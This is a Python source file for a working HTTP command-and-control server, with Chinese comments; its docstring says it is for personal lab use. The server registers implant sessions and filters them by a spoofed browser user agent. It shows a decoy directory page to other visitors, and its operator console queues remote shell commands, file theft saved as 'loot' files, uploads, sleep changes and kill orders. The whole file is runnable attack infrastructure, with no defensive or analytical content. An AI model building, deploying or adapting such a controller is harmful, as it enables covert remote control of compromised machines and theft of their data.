#!/usr/bin/env python3
"""lab-c2/c2_server.py - 最小 HTTP C2 控制器 (靶场自用)

组件: 会话注册 / 任务队列 / 结果回收 / 交互式操作台
依赖: pip install aiohttp
启动: python c2_server.py --host 0.0.0.0 --port 8080
"""
import argparse
import base64
import itertools
import sys
import threading
import time
import uuid

from aiohttp import web

# ---- Malleable 配置: 改这里就能改流量指纹 ----
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
BEACON_URI = "/api/v1/beacon"
RESULT_URI = "/api/v1/result"
DECOY = ("<html><head><title>Index of /</title></head>"
         "<body><h1>Index of /</h1><hr><pre>static/</pre></body></html>")

SESSIONS = {}          # sid -> {queue, results, host, user, ...}
LOCK = threading.Lock()
SEQ = itertools.count(1)
CUR = {"sid": None}


def log(*a):
    print(time.strftime("[%H:%M:%S]"), *a, flush=True)


def push(sid, ttype, a="", b=""):
    """给会话塞一个任务, 返回任务 id"""
    with LOCK:
        tid = next(SEQ)
        SESSIONS[sid]["queue"].append({"id": tid, "type": ttype, "a": a, "b": b})
    return tid


async def h_beacon(request):
    """信标心跳: 上报环境 -> 领取任务"""
    if request.headers.get("User-Agent", "") != UA:
        return web.Response(status=404, text="Not Found")
    try:
        d = await request.json()
    except Exception:
        return web.Response(status=400)
    sid = d.get("id") or str(uuid.uuid4())
    with LOCK:
        s = SESSIONS.setdefault(sid, {"queue": [], "results": [], "first": time.time()})
        first = len(s["queue"]) == 0 and not s.get("seen")
        s.update(host=d.get("host", "?"), user=d.get("user", "?"), os=d.get("os", "?"),
                 arch=d.get("arch", "?"), pid=d.get("pid", 0), pwd=d.get("pwd", "?"),
                 last=time.time(), ip=request.remote, seen=True)
        tasks, s["queue"] = s["queue"], []
    if first:
        log(f"新会话 {sid[:8]} {s['user']}@{s['host']} pid={s['pid']} ip={s['ip']}")
    return web.json_response({"tasks": tasks})


async def h_result(request):
    """结果回收"""
    try:
        d = await request.json()
    except Exception:
        return web.Response(status=400)
    sid = d.get("id")
    with LOCK:
        s = SESSIONS.get(sid)
        if s:
            s["results"].append(d)
    out = d.get("out", "") or ""
    if d.get("encoding") == "base64" and d.get("type") == "download":
        try:
            raw = base64.b64decode(out)
            name = (d.get("a", "download.bin").replace("\\", "_").replace(":", "") or "download.bin")
            path = f"loot_{sid[:8]}_{name}"
            with open(path, "wb") as f:
                f.write(raw)
            out = f"[+] 已保存 {path} ({len(raw)} 字节)"
        except Exception as e:
            out = f"[-] 保存失败: {e}"
    elif d.get("encoding") == "base64":
        try:
            out = base64.b64decode(out).decode("utf-8", "replace")
        except Exception:
            pass
    log(f"结果 #{d.get('task')} {d.get('type')} [{sid[:8]}]")
    if out.strip():
        print(out.rstrip(), flush=True)
    return web.json_response({"ok": True})


async def h_index(request):
    return web.Response(text=DECOY, content_type="text/html")


HELP = ("命令:\n"
        "  list                 列出会话\n"
        "  use N                选中第 N 个会话\n"
        "  exec <命令>          目标执行 cmd\n"
        "  dl <远程路径>        下载文件到本目录\n"
        "  ul <本地> <远程>     上传文件到目标\n"
        "  sleep <秒>           改心跳间隔\n"
        "  kill                 结束信标\n"
        "  help")


def console():
    time.sleep(0.3)
    print(HELP, flush=True)
    while True:
        try:
            line = sys.stdin.readline()
        except Exception:
            return
        if not line:
            return
        parts = line.strip().split(None, 2)
        if not parts:
            continue
        cmd = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else ""
        with LOCK:
            sids = list(SESSIONS.keys())
        try:
            if cmd == "help":
                print(HELP)
            elif cmd == "list":
                if not sids:
                    print("(无会话)")
                for i, sid in enumerate(sids):
                    s = SESSIONS[sid]
                    mark = "*" if sid == CUR["sid"] else " "
                    print(f"{mark}[{i}] {sid[:8]} {s.get('user')}@{s.get('host')} "
                          f"pid={s.get('pid')} ip={s.get('ip')} "
                          f"心跳 {int(time.time() - s.get('last', 0))}s 前")
            elif cmd == "use":
                CUR["sid"] = sids[int(arg)]
                print("已选中", CUR["sid"][:8])
            elif cmd in ("exec", "dl", "ul", "sleep", "kill"):
                sid = CUR["sid"]
                if not sid:
                    print("先 use 一个会话")
                    continue
                if cmd == "exec":
                    push(sid, "shell", arg)
                elif cmd == "dl":
                    push(sid, "download", arg)
                elif cmd == "ul":
                    local, remote = arg.split(None, 1)
                    with open(local, "rb") as f:
                        push(sid, "upload", base64.b64encode(f.read()).decode(), remote)
                elif cmd == "sleep":
                    push(sid, "sleep", arg)
                elif cmd == "kill":
                    push(sid, "exit")
                print(f"已入队 {cmd} {arg}")
            else:
                print("未知命令, help 看用法")
        except Exception as e:
            print("命令失败:", e)


def build_app():
    """路由表独立出来, 便于单测/嵌入运行"""
    app = web.Application()
    app.router.add_post(BEACON_URI, h_beacon)
    app.router.add_post(RESULT_URI, h_result)
    app.router.add_get("/", h_index)
    return app


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="0.0.0.0")
    ap.add_argument("--port", type=int, default=8080)
    args = ap.parse_args()

    app = build_app()
    threading.Thread(target=console, daemon=True).start()
    log(f"C2 监听 http://{args.host}:{args.port}  beacon={BEACON_URI} result={RESULT_URI}")
    web.run_app(app, host=args.host, port=args.port, print=None)


if __name__ == "__main__":
    main()
